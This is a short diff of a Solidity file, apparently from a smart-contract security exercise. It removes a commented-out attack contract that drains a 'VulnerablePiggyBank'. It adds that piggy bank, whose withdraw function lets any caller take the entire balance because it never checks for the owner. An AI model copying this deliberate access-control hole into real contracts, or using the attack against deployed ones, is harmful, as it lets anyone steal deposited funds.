@@ -1,20 +1,11 @@
-// // SPDX-License-Identifier: MIT
-// pragma solidity ^0.8.0;
+// SPDX-License-Identifier: MIT
 
-// import "./VulnerablePiggyBank.sol";
+pragma solidity ^0.8.0;
 
-// contract AttackPiggyBank {
-//     VulnerablePiggyBank public target;
-
-//     constructor(address _target) {
-//         target = VulnerablePiggyBank(_target);
-//     }
-
-//     // Attack by calling withdraw on the vulnerable contract
-//     function attack() public {
-//         target.withdraw();
-//     }
-
-//     // Receive stolen funds
-//     receive() external payable {}
-// }
+contract VulnerablePiggyBank {
+    address public owner;
+    constructor() { owner = msg.sender ; }
+    function deposit() public payable {}
+    function withdraw() public { payable(msg.sender).transfer(address(this).balance); }
+    function attack() public { }
+}
